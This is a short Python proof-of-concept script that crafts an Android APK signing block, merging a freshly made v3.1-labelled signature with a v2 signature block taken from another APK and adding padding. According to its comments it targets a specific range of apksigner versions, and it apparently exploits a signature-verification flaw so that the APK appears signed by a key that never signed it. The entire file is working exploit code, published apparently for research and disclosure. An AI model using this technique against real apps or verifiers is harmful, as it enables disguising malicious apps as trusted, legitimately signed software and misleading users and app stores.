#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2025 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import apksigcopier
import apksigtool
import dataclasses


# requires:
# - app4.apk with minSdk >= 33
# - fake.apk with v2 signature
# - apksigner from e.g. build-tools 33.0.0 (32.0.0 is too old, 34.0.0 too new,
#   it must be between commits 5be82c38d60ef3c1d9fc42bdbca8495434c88f0d and
#   8add6a4c0cc3e92c29f61ef83325da3bb6f0b28b)
apksigcopier.copy_apk("app4.apk", "poc-unsigned.apk")

apksigtool.APK_SIGNATURE_SCHEME_V3_BLOCK_ID = apksigtool.APK_SIGNATURE_SCHEME_V31_BLOCK_ID
apksigtool.do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
                   key="privkey-rsa.der", no_v1=True, no_v2=True)

_, sig_block_a = old_v2_sig_a = apksigtool.extract_v2_sig("poc.apk")
_, sig_block_b = old_v2_sig_b = apksigtool.extract_v2_sig("fake.apk")
blk_a = apksigtool.parse_apk_signing_block(sig_block_a, allow_nonzero_verity=True)
blk_b = apksigtool.parse_apk_signing_block(sig_block_b, allow_nonzero_verity=True)
blk_a_pairs = list(blk_a.pairs)
blk_b_pairs = [p for p in blk_b.pairs if p.id == apksigtool.APK_SIGNATURE_SCHEME_V2_BLOCK_ID]
size = sum(len(p.dump()) for p in blk_a_pairs + blk_b_pairs) + 32 + 12
pad_blk = apksigtool.VerityPaddingBlock(4096 - size % 4096)
pairs = tuple(blk_a_pairs + blk_b_pairs + [apksigtool.Pair.from_block(pad_blk)])
blk_poc = dataclasses.replace(blk_a, pairs=pairs)
apksigtool.replace_apk_signing_block("poc.apk", blk_poc.dump(), old_v2_sig=old_v2_sig_a)
